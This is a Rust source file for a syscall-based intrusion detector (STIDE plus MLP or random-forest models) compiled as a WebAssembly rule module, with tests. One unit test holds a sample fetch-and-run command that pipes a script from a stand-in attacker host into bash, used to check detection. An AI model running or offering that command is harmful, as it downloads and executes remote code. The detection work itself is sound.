//! ml-detector: ML inference inside the WasmSentinel rule sandbox.
//!
//! Syscall events go through STIDE (n-gram fast path) and, when STIDE flags
//! them, through a model on feature set v1 over the process's recent syscall
//! numbers. Two models ship in the module: a small MLP (the default deep path,
//! `weights.rs`) and a random forest (`forest.rs`, `train/rf_model.bin`);
//! `init` picks one with `{"model": "mlp" | "rf"}`. Both can be replaced at
//! run time (`load_mlp_weights`, `load_rf_model`), which is how the E1
//! evaluation scores every test trace with per-fold models through the same
//! compiled module that is deployed.

mod features;
mod forest;
mod forest_meta;
mod hybrid;
mod mlp;
mod stide;
mod weights;

use std::sync::Mutex;

use sentinel_abi::{EventFields, JsonEvent, RawEvent};
use serde::{Deserialize, Serialize};
use serde_json::Value;

// Re-exports for tests and the parity harness
pub use features::{adfa_features, ADFA_FEATURE_DIM};
pub use forest::Forest;
pub use forest_meta::{
    RF_MAX_DEPTH, RF_MODEL_SHA256, RF_MODEL_SOURCE, RF_N_NODES, RF_N_TREES, RF_TRAINING,
};
pub use hybrid::HybridDetector;
pub use mlp::MlpDetector;
pub use stide::StideDetector;
pub use weights::{
    DEFAULT_THRESHOLD, HIDDEN_SIZES, INPUT_SIZE, MODEL_SHA256, MODEL_SOURCE, NUM_PARAMETERS,
};

/// Scorer used by `mlp_score` / `mlp_features`: the embedded model until
/// `load_mlp_weights` replaces it (evaluation harnesses load per-fold models).
static SCORER: Mutex<Option<MlpDetector>> = Mutex::new(None);

fn with_scorer<T>(f: impl FnOnce(&MlpDetector) -> T) -> T {
    let mut guard = SCORER.lock().unwrap_or_else(|e| e.into_inner());
    let det = guard.get_or_insert_with(MlpDetector::with_embedded_weights);
    f(det)
}

/// Forest used by `rf_score`: the embedded one until `load_rf_model`
/// replaces it.
static RF_SCORER: Mutex<Option<Forest>> = Mutex::new(None);

fn with_forest<T>(f: impl FnOnce(&Forest) -> T) -> T {
    let mut guard = RF_SCORER.lock().unwrap_or_else(|e| e.into_inner());
    let forest = guard.get_or_insert_with(Forest::embedded);
    f(forest)
}

/// Global detector instance
static mut DETECTOR: Option<HybridDetector> = None;

/// Event types supported by the detector
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum Event {
    #[serde(rename = "process")]
    Process(ProcessEvent),
    #[serde(rename = "network")]
    Network(NetworkEvent),
    #[serde(rename = "file")]
    File(FileEvent),
    #[serde(rename = "syscall")]
    Syscall(SyscallEvent),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEvent {
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub executable: String,
    pub name: String,
    pub command_line: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkEvent {
    pub pid: u32,
    pub src_ip: String,
    pub dest_ip: String,
    pub src_port: u16,
    pub dest_port: u16,
    pub protocol: String,
    pub direction: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileEvent {
    pub pid: u32,
    pub path: String,
    pub operation: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallEvent {
    pub pid: u32,
    pub syscall_nr: u32,
    pub syscall_name: String,
    pub ret: i64,
    pub timestamp: u64,
}

/// Detection result with detailed information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionResult {
    pub threat_level: i32,        // 0-10, 0 = no threat
    pub confidence: f32,          // 0.0-1.0
    pub detection_method: String, // "stide", "mlp", or "hybrid"
    pub anomaly_score: f32,       // Raw anomaly score
    pub details: String,          // Human-readable explanation
}

// ---------------------------------------------------------------------------
// Guest ABI v2: host-visible allocator.
//
// The host calls `alloc` once per rule instance to obtain an event buffer in
// linear memory, copies the serialized event into it and then calls
// `detect(ptr, len)`. The buffer is released with `dealloc` when the host grows
// it or drops the instance. Writing at a fixed offset (the pre-v2 behaviour)
// is no longer supported: it silently overlapped the shadow stack.
// ---------------------------------------------------------------------------

/// Allocate `size` bytes in linear memory and hand ownership to the host.
#[no_mangle]
pub extern "C" fn alloc(size: usize) -> *mut u8 {
    let mut buf = Vec::<u8>::with_capacity(size);
    let ptr = buf.as_mut_ptr();
    std::mem::forget(buf);
    ptr
}

/// Release a buffer previously returned by [`alloc`] with the same `size`.
///
/// # Safety
/// `ptr` must come from `alloc(size)` and must not be used afterwards.
#[no_mangle]
pub unsafe extern "C" fn dealloc(ptr: *mut u8, size: usize) {
    if !ptr.is_null() && size > 0 {
        drop(Vec::from_raw_parts(ptr, 0, size));
    }
}

/// Initialize the detector with optional model data
///
/// # Arguments
/// * `config_ptr` - Pointer to configuration JSON
/// * `config_len` - Length of configuration data
///
/// # Returns
/// * 0 on success, negative on error
#[no_mangle]
pub extern "C" fn init(config_ptr: *const u8, config_len: usize) -> i32 {
    let config_data = if config_ptr.is_null() || config_len == 0 {
        None
    } else {
        Some(unsafe { std::slice::from_raw_parts(config_ptr, config_len) })
    };

    let detector = match config_data {
        Some(data) => match serde_json::from_slice::<Value>(data) {
            Ok(config) => HybridDetector::from_config(&config),
            Err(_) => HybridDetector::new(),
        },
        None => HybridDetector::new(),
    };

    unsafe {
        DETECTOR = Some(detector);
    }

    0
}

/// Main detection function - analyzes event and returns threat level
///
/// # Arguments
/// * `event_ptr` - Pointer to event JSON data
/// * `event_len` - Length of event data
///
/// # Returns
/// * 0 - No threat detected
/// * 1-10 - Threat level (1=low, 10=critical)
/// * -1 - Error processing event
#[no_mangle]
pub extern "C" fn detect(event_ptr: *const u8, event_len: usize) -> i32 {
    // Safety check
    if event_ptr.is_null() || event_len == 0 {
        return 0;
    }

    let event_data = unsafe { std::slice::from_raw_parts(event_ptr, event_len) };

    // Parse event JSON
    let event: Value = match serde_json::from_slice(event_data) {
        Ok(e) => e,
        Err(_) => return -1,
    };
    detect_value(&event)
}

/// Binary path: the host writes the kernel record (sentinel-abi layout) straight
/// into linear memory and the detector reads fields from it directly.
#[no_mangle]
pub extern "C" fn detect_raw(payload_ptr: *const u8, payload_len: usize) -> i32 {
    if payload_ptr.is_null() || payload_len == 0 {
        return 0;
    }
    let bytes = unsafe { std::slice::from_raw_parts(payload_ptr, payload_len) };
    let payload = match sentinel_abi::parse(bytes) {
        Ok(p) => p,
        Err(_) => return -1,
    };
    detect_fields(&RawEvent(&payload))
}

fn detect_value(event: &Value) -> i32 {
    detect_fields(&JsonEvent(event))
}

fn detect_fields<E: EventFields>(event: &E) -> i32 {
    // Get or create detector
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };
    detector.detect_fields(event).threat_level
}

// ---------------------------------------------------------------------------
// Model-level exports for the evaluation harness and the parity check. They
// bypass STIDE and per-process state: a syscall-number sequence in, the
// embedded MLP's score (or its feature vector) out.
// ---------------------------------------------------------------------------

/// Score of the embedded model for a syscall-number sequence (feature set v1).
/// Returns -1.0 on a null pointer.
#[no_mangle]
pub extern "C" fn mlp_score(seq_ptr: *const u32, seq_len: usize) -> f32 {
    if seq_ptr.is_null() && seq_len > 0 {
        return -1.0;
    }
    let seq: &[u32] = if seq_len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(seq_ptr, seq_len) }
    };
    with_scorer(|m| m.score(&adfa_features(seq)))
}

/// Feature set v1 for a syscall-number sequence, written to `out` (64 f32).
/// Returns the number of features written, or -1 on a null pointer.
#[no_mangle]
pub extern "C" fn mlp_features(seq_ptr: *const u32, seq_len: usize, out: *mut f32) -> i32 {
    if out.is_null() || (seq_ptr.is_null() && seq_len > 0) {
        return -1;
    }
    let seq: &[u32] = if seq_len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(seq_ptr, seq_len) }
    };
    let f = adfa_features(seq);
    unsafe { std::ptr::copy_nonoverlapping(f.as_ptr(), out, f.len()) };
    f.len() as i32
}

/// Score of the random forest (embedded, or the one `load_rf_model` loaded)
/// for a syscall-number sequence (feature set v1). Returns -1.0 on a null
/// pointer.
#[no_mangle]
pub extern "C" fn rf_score(seq_ptr: *const u32, seq_len: usize) -> f32 {
    if seq_ptr.is_null() && seq_len > 0 {
        return -1.0;
    }
    let seq: &[u32] = if seq_len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(seq_ptr, seq_len) }
    };
    with_forest(|f| f.score(&adfa_features(seq)))
}

/// Replace the random forest at run time with a forest image (WSRF v1,
/// train/forest_export.py). Affects `rf_score` and switches the hybrid
/// detector's deep path to the loaded forest; the embedded forest stays the
/// default for fresh instances. Returns 0, or -1 when the image is invalid.
#[no_mangle]
pub extern "C" fn load_rf_model(ptr: *const u8, len: usize) -> i32 {
    if ptr.is_null() || len == 0 {
        return -1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(ptr, len) };
    let forest = match Forest::from_bytes(bytes) {
        Ok(f) => f,
        Err(_) => return -1,
    };
    *RF_SCORER.lock().unwrap_or_else(|e| e.into_inner()) = Some(forest.clone());
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };
    detector.load_forest(forest);
    0
}

/// Replace the MLP weights at run time with a weights JSON (training export
/// format). Affects `mlp_score` and the hybrid detector; the embedded weights
/// stay the default for fresh instances. Returns 0, or -1 on a parse error.
#[no_mangle]
pub extern "C" fn load_mlp_weights(json_ptr: *const u8, json_len: usize) -> i32 {
    if json_ptr.is_null() || json_len == 0 {
        return -1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(json_ptr, json_len) };
    let json = match std::str::from_utf8(bytes) {
        Ok(s) => s,
        Err(_) => return -1,
    };
    let threshold = with_scorer(|m| m.get_config().threshold);
    let scorer = match MlpDetector::from_weights_json(json, threshold) {
        Ok(m) => m,
        Err(_) => return -1,
    };
    *SCORER.lock().unwrap_or_else(|e| e.into_inner()) = Some(scorer);
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };
    if detector.load_mlp_weights(json).is_err() {
        return -1;
    }
    0
}

/// JSON description of the embedded models (caller frees with `free_result`).
/// The top-level fields describe the MLP as before; `rf` the random forest;
/// `default_model` the deep path a fresh instance uses.
#[no_mangle]
pub extern "C" fn model_info(len_ptr: *mut usize) -> *const u8 {
    let info = serde_json::json!({
        "feature_set": "v1",
        "input_size": INPUT_SIZE,
        "hidden_sizes": HIDDEN_SIZES,
        "num_parameters": NUM_PARAMETERS,
        "threshold": DEFAULT_THRESHOLD,
        "source": MODEL_SOURCE,
        "sha256": MODEL_SHA256,
        "default_model": hybrid::HybridConfig::default().model,
        "rf": {
            "n_trees": RF_N_TREES,
            "n_nodes": RF_N_NODES,
            "max_depth": RF_MAX_DEPTH,
            "source": RF_MODEL_SOURCE,
            "sha256": RF_MODEL_SHA256,
            "training": RF_TRAINING,
        },
    });
    let json = serde_json::to_vec(&info).unwrap_or_default();
    if !len_ptr.is_null() {
        unsafe { *len_ptr = json.len() };
    }
    let ptr = json.as_ptr();
    std::mem::forget(json);
    ptr
}

/// Extended detection with detailed results
/// Returns a pointer to JSON result (caller must free)
#[no_mangle]
pub extern "C" fn detect_extended(
    event_ptr: *const u8,
    event_len: usize,
    result_len: *mut usize,
) -> *const u8 {
    if event_ptr.is_null() || event_len == 0 {
        return std::ptr::null();
    }

    let event_data = unsafe { std::slice::from_raw_parts(event_ptr, event_len) };

    let event: Value = match serde_json::from_slice(event_data) {
        Ok(e) => e,
        Err(_) => return std::ptr::null(),
    };

    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };

    let result = detector.detect(&event);

    // Serialize result to JSON
    let json = match serde_json::to_vec(&result) {
        Ok(j) => j,
        Err(_) => return std::ptr::null(),
    };

    unsafe {
        *result_len = json.len();
    }

    // Leak the memory (caller must free)
    let ptr = json.as_ptr();
    std::mem::forget(json);
    ptr
}

/// Train the detector with normal behavior data
///
/// # Arguments
/// * `data_ptr` - Pointer to training data (array of events)
/// * `data_len` - Length of training data
///
/// # Returns
/// * Number of samples trained on, or negative on error
#[no_mangle]
pub extern "C" fn train(data_ptr: *const u8, data_len: usize) -> i32 {
    if data_ptr.is_null() || data_len == 0 {
        return -1;
    }

    let data = unsafe { std::slice::from_raw_parts(data_ptr, data_len) };

    let events: Vec<Value> = match serde_json::from_slice(data) {
        Ok(e) => e,
        Err(_) => return -1,
    };

    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };

    detector.train(&events);
    events.len() as i32
}

/// Feed one normal syscall trace to STIDE: `len` bytes of little-endian u32
/// syscall numbers (no alignment requirement). Returns the number of syscalls
/// consumed. The host calls this once per trace, then `train_finish`.
#[no_mangle]
pub extern "C" fn train_sequence(data_ptr: *const u8, len: usize) -> i32 {
    if data_ptr.is_null() && len > 0 {
        return -1;
    }
    let bytes: &[u8] = if len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(data_ptr, len) }
    };
    let seq: Vec<u32> = bytes
        .chunks_exact(4)
        .map(|c| u32::from_le_bytes([c[0], c[1], c[2], c[3]]))
        .collect();
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };
    detector.train_sequence(&seq);
    seq.len() as i32
}

/// Finalize STIDE training; returns the number of normal n-grams.
#[no_mangle]
pub extern "C" fn train_finish() -> i32 {
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };
    detector.train_finish() as i32
}

/// Get detector statistics
#[no_mangle]
pub extern "C" fn get_stats(stats_len: *mut usize) -> *const u8 {
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_ref().unwrap()
    };

    let stats = detector.get_stats();
    let json = match serde_json::to_vec(&stats) {
        Ok(j) => j,
        Err(_) => return std::ptr::null(),
    };

    unsafe {
        *stats_len = json.len();
    }

    let ptr = json.as_ptr();
    std::mem::forget(json);
    ptr
}

/// Free memory allocated by the detector
#[no_mangle]
pub extern "C" fn free_result(ptr: *mut u8, len: usize) {
    if !ptr.is_null() && len > 0 {
        unsafe {
            let _ = Vec::from_raw_parts(ptr, len, len);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_init() {
        assert_eq!(init(std::ptr::null(), 0), 0);
    }

    #[test]
    fn test_detect_process() {
        // Use HybridDetector directly to avoid static mut issues in tests
        let mut detector = HybridDetector::new();

        let event = serde_json::json!({
            "type": "process",
            "data": {
                "process": {
                    "executable": "/bin/bash",
                    "name": "bash",
                    "command_line": "bash -c 'wget http://evil.com/malware.sh | bash'",
                    "uid": 0
                }
            }
        });

        let result = detector.detect(&event);
        assert!(result.threat_level > 0, "Should detect suspicious command");
    }

    #[test]
    fn test_detect_syscall_sequence() {
        let mut detector = HybridDetector::new();

        // Simulate a sequence of syscalls
        let syscalls = vec!["execve", "open", "read", "mmap", "mprotect", "write"];

        for (i, syscall) in syscalls.iter().enumerate() {
            let event = serde_json::json!({
                "type": "syscall",
                "pid": 1234,
                "syscall_nr": i,
                "syscall_name": syscall,
                "ret": 0,
                "timestamp": 1234567890 + i as u64
            });

            let _ = detector.detect(&event);
        }
    }

    #[test]
    fn test_stide_basic() {
        let mut stide = StideDetector::new();

        // Train on normal sequence
        for _ in 0..20 {
            stide.train_on("open");
            stide.train_on("read");
            stide.train_on("close");
        }
        stide.fit();

        assert!(stide.database_size() > 0, "Should have trained ngrams");
    }

    #[test]
    fn test_mlp_basic() {
        let mut mlp = MlpDetector::new();
        let features = vec![0.5; 64];
        let score = mlp.detect(&features);

        assert!(score >= 0.0 && score <= 1.0, "Score should be in [0, 1]");
    }
}
